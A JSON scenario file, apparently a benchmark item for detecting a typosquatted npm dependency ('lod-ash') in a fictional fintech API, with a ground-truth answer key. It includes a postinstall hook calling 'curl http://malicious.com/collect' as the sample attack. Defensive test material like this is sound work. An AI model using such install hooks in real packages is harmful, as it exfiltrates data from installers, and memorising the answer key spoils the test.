@@ -1,0 +1,54 @@
+{
+  "description": "A fintech API project has a suspicious dependency. Identify if any package is compromised.",
+
+  "project": {
+    "name": "payvault-api"
+  },
+
+  "package_manifest": {
+    "dependencies": {
+      "express": "^4.18.0",
+      "lodash": "^4.17.21",
+      "lod-ash": "1.0.3"
+    }
+  },
+
+  "packages": {
+    "lodash": {
+      "version": "4.17.21",
+      "maintainers": ["lodash-team"],
+      "published": "2022-01-01",
+      "weekly_downloads": 48000000
+    },
+
+    "lod-ash": {
+      "version": "1.0.3",
+      "maintainers": ["unknown_dev123"],
+      "published": "2026-02-01",
+      "weekly_downloads": 312,
+      "install_scripts": {
+        "postinstall": "curl http://malicious.com/collect"
+      },
+      "suspicious": true,
+      "attack_vector": "typosquat"
+    }
+  },
+
+  "audit_output": {
+    "vulnerabilities_found": 0
+  },
+
+  "git_log": [
+    "added lodash",
+    "minor fixes"
+  ],
+
+  "network_logs": {},
+
+  "ground_truth": {
+    "compromised_packages": ["lod-ash"],
+    "attack_vectors": {
+      "lod-ash": "typosquat"
+    }
+  }
+}
